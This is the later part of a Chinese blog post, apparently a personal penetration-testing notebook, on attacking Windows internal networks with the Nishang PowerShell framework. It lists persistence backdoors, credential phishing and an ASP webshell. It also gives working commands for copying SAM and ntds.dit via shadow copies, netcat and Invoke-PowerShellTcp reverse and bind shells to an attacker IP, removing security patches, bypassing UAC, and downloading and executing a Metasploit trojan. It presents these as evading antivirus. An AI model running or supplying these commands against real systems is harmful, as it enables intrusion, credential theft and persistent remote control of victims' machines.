+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">2</span><span class="p">.</span><span class="k">Add</span><span class="o">-</span><span class="n">ScrnSaveBackdoor</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">利用</span><span class="n">windows</span><span class="err">的屏保来留下一个隐藏的后门</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">3</span><span class="p">.</span><span class="n">Execute</span><span class="o">-</span><span class="n">OnTime</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">与</span><span class="n">Http</span><span class="o">-</span><span class="n">Backdoor</span><span class="err">相比，多了定时功能</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">4</span><span class="p">.</span><span class="n">Invoke</span><span class="o">-</span><span class="n">ADSBackdoor</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">使用</span><span class="n">NTFS</span><span class="err">数据流留下的一个永久后门</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">最恐怖的后门</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">## 钓鱼攻击(有道用户输入自己机器的密码)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Invoke</span><span class="o">-</span><span class="n">CredentialsPhish</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">## webshell后门   位于 \nishang\Antak-WebShell目录下
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">就是一个</span><span class="n">asp</span><span class="err">的大马（使用的是</span><span class="n">powershell</span><span class="err">的命令，比</span><span class="n">cmd</span><span class="err">命令强大）</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1"># 复制sam文件（如果运行在DC机上，ntds.dit和SYSTEM hive也能被拷贝出来）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Copy</span><span class="o">-</span><span class="n">VSS</span><span class="w">    </span><span class="c1"># 直接把文件保存在当前路径下
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">Copy</span><span class="o">-</span><span class="n">VSS</span><span class="w"> </span><span class="o">-</span><span class="n">DEstinationDir</span><span class="w"> </span><span class="n">C</span><span class="p">:</span><span class="n">temp</span><span class="w">    </span><span class="c1"># 制定文件保存路径（必须是已存在的路径）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">## 其他......
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="后续控制">后续控制</h6>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># windows上没有nc，需要提前上传一个nc.exe，推荐Linux</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## No1.反向连接（我用公网来连接目标内网，因为我获取不到内网的公网ip）  在Shells目录下面</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#1.攻击机器上 NC下执行: </span>
+</span></span><span class="line"><span class="cl"><span class="n">nc</span> <span class="o">-</span><span class="n">lvp</span> <span class="mi">3333</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#2.在目标服务器 PowerShell下执行：  TCO的</span>
+</span></span><span class="line"><span class="cl"><span class="n">Invoke</span><span class="o">-</span><span class="n">PowerShellTcp</span> <span class="o">-</span><span class="n">Reverse</span> <span class="o">-</span><span class="n">IPAddress</span> <span class="mf">192.168.0.103</span> <span class="o">-</span><span class="n">Port</span> <span class="mi">3333</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## NO2.正向连接:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#1.目标 PowerShell下执行:  TCP的，  另外还有UDP的: </span>
+</span></span><span class="line"><span class="cl"><span class="n">Invoke</span><span class="o">-</span><span class="n">PowerShellTcp</span> <span class="o">-</span><span class="n">Bind</span> <span class="o">-</span><span class="n">Port</span> <span class="mi">3333</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#NC下执行: 请求他的3333端口</span>
+</span></span><span class="line"><span class="cl"><span class="n">nc</span> <span class="o">-</span><span class="n">nv</span> <span class="mf">192.168.0.103</span> <span class="mi">3333</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">### 基于UDP( Invoke-PowerShellUdp )，  nc命令有点不同</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">正向连接</span>
+</span></span><span class="line"><span class="cl"><span class="n">nc</span> <span class="o">-</span><span class="n">nvu</span> <span class="mf">192.168.0.103</span> <span class="mi">3333</span>
+</span></span><span class="line"><span class="cl"><span class="n">反向连接</span>
+</span></span><span class="line"><span class="cl"><span class="n">nc</span> <span class="n">lup</span> <span class="mi">3333</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">### 基于http和https  （ Invoke-PoshRatHttp ）</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">### 此外,还有http的shell(执行完会生成一条命令，然后???)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Invoke</span><span class="o">-</span><span class="n">PoshRatHttp</span> <span class="o">-</span><span class="n">Reverse</span> <span class="o">-</span><span class="n">IPAddress</span> <span class="mf">192.168.0.103</span> <span class="o">-</span><span class="n">Port</span> <span class="mi">3333</span>
+</span></span><span class="line"><span class="cl"><span class="n">Invoke</span><span class="o">-</span><span class="n">PoshRatHttps</span> <span class="o">-</span><span class="n">Reverse</span> <span class="o">-</span><span class="n">IPAddress</span> <span class="mf">192.168.0.103</span> <span class="o">-</span><span class="n">Port</span> <span class="mi">3333</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 然后将生成的命令复制到`目标机`cmd执行，执行完毕会自动消失，然后在本机的powershell下会返回目标机的会话</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="域渗透">域渗透</h6>
+<p>在nishang目录下面的ActiveDirectory下面</p>
+<p><strong>疑难杂症</strong>
+1.真实案例分析</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"></code></pre></td></tr></table>
+</div>
+</div><p>2.各种安全限制</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">无解析</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">无权限</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">无执行</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="系统提权">系统提权</h6>
+<ul>
+<li>基于数据库</li>
+<li>基于漏洞（常用，如果电脑没补丁，可以删除补丁）</li>
+<li>第三方软件</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 查看系统的补丁</span>
+</span></span><span class="line"><span class="cl"><span class="n">systeminfo</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 删除补丁</span>
+</span></span><span class="line"><span class="cl"><span class="n">Remove</span><span class="o">-</span><span class="n">Update</span>   <span class="c1"># 然后输入补丁编号</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 删除全部补丁</span>
+</span></span><span class="line"><span class="cl"><span class="n">Remove</span><span class="o">-</span><span class="n">Update</span> <span class="n">All</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 删除全部的安全补丁</span>
+</span></span><span class="line"><span class="cl"><span class="n">Remove</span><span class="o">-</span><span class="n">Update</span> <span class="n">Security</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 删除指定的补丁</span>
+</span></span><span class="line"><span class="cl"><span class="n">Remove</span><span class="o">-</span><span class="n">Update</span> <span class="n">KB2761226</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#### Bypass  UAC    :   模块:Invoke-PsUACme</span>
+</span></span><span class="line"><span class="cl"><span class="n">UAC</span> <span class="p">(</span><span class="n">用户账户控制</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Get</span><span class="o">-</span><span class="n">Help</span>  <span class="n">获取帮助</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="powershell下载文件nishang">powershell下载文件(nishang)</h6>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">$</span><span class="n">client</span> <span class="o">=</span> <span class="n">new</span><span class="o">-</span><span class="nb">object</span> <span class="n">System</span><span class="o">.</span><span class="n">Net</span><span class="o">.</span><span class="n">WebClient</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">client</span><span class="o">.</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s1">&#39;#1&#39;</span><span class="p">,</span> <span class="s1">&#39;#2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#1是需要下载文件的url</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#2是保存为本地文件的路径，包括文件名</span>
+</span></span><span class="line"><span class="cl"><span class="n">例如</span><span class="err">：</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">client</span><span class="o">.</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s1">&#39;https://www.2cto.com/net/201611/562900.html&#39;</span><span class="p">,</span> <span class="s1">&#39;D:/562900.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 或者这个方法</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">src</span> <span class="o">=</span> <span class="s1">&#39;https://www.pstips.net/index.php&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">des</span> <span class="o">=</span> <span class="s2">&#34;$env:temp\index.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Invoke</span><span class="o">-</span><span class="n">WebRequest</span> <span class="o">-</span><span class="n">uri</span> <span class="err">$</span><span class="n">src</span> <span class="o">-</span><span class="n">OutFile</span> <span class="err">$</span><span class="n">des</span>
+</span></span><span class="line"><span class="cl"><span class="n">Unblock</span><span class="o">-</span><span class="n">File</span> <span class="err">$</span><span class="n">des</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 下载完之后就可以用啦</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## 下载执行       Download_Execute</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">下载文本文件</span><span class="err">，</span><span class="n">然后转换为可执行文件执行</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">利用exetotext</span><span class="o">.</span><span class="n">ps1把msf生成的木马端</span><span class="err">`</span><span class="n">msf</span><span class="o">.</span><span class="n">exe</span><span class="err">`</span><span class="n">更改为</span><span class="err">`</span><span class="n">msf</span><span class="o">.</span><span class="n">txt</span><span class="err">`</span><span class="n">文件</span>
+</span></span><span class="line"><span class="cl"><span class="n">ExetoTxt</span> <span class="n">c</span><span class="p">:</span><span class="n">msf</span><span class="o">.</span><span class="n">exe</span>  <span class="n">c</span><span class="p">:</span><span class="n">msf</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">然后输入以下命令</span><span class="err">，</span><span class="n">调用</span><span class="err">`</span><span class="n">Download</span> <span class="n">Execute</span><span class="err">`</span><span class="n">脚本下载并执行该文件</span>
+</span></span><span class="line"><span class="cl"><span class="n">Download</span> <span class="n">Execute</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.110.128</span><span class="o">/</span><span class="n">msf</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">这时</span><span class="err">，</span><span class="n">msf的监听端就会成功获得反弹回来的shell</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>powershell是没有杀毒软件提示的</p>
+</blockquote>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title=2023-01-21&#32;16:47:23>更新于 2023-01-21&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"><span><a href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span><span><a href="https://github.com/shuai06/edit/main/content/posts/%e5%86%85%e7%bd%91%e6%b8%97%e9%80%8f.md" title="编辑此页"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">编辑此页</a></span></div>
+      <div class="post-info-share">
+        <span></span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/%E5%86%85%E7%BD%91/' class="post-tag">内网</a><a href='/tags/%E6%B8%97%E9%80%8F/' class="post-tag">渗透</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/scrcpy-%E6%89%8B%E6%9C%BA%E4%B8%8E%E7%94%B5%E8%84%91%E6%8A%95%E5%B1%8F%E7%A5%9E%E5%99%A8/" class="post-nav-item" rel="prev" title="scrcpy-手机与电脑投屏神器"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>scrcpy-手机与电脑投屏神器</a>
+      <a href="/ubuntu-server-%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/" class="post-nav-item" rel="next" title="ubuntu server-网络相关知识">ubuntu server-网络相关知识<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="giscus">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="hugo-fixit/FixIt"
+            data-repo-id="R_kgDOGihPtQ"
+            data-category="General"
+            data-category-id="DIC_kwDOGihPtc4CApHX"
+            data-mapping="title"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div></article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.109.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.17-RC"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">
+              <a href="http://geoer.cn"target="_blank" rel="external nofollow noopener noreferrer">剑胆琴心</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;--bg-progress: #000;--bg-progress-dark: #fff;"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/algoliasearch/algoliasearch-lite.umd.min.js" defer></script><script src="/lib/lazysizes/lazysizes.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":true,"expired":false,"giscus":{"darkTheme":"dark_dimmed","lightTheme":"light"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"enablePWA":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"pangu":{"enable":true,"selector":"article"},"search":{"algoliaAppID":"YKOM6PKLUY","algoliaIndex":"index.zh-cn","algoliaSearchKey":"a44c110d3ac360be2c69cd79d34b77a8","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"watermark":{"content":"\u003cimg class=\"fixit-icon\" src=\"/images/avatar.png\" alt=\"FixIt logo\" /\u003e 剑胆琴心","enable":true,"height":21,"opacity":0.0125}};</script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
+</html>
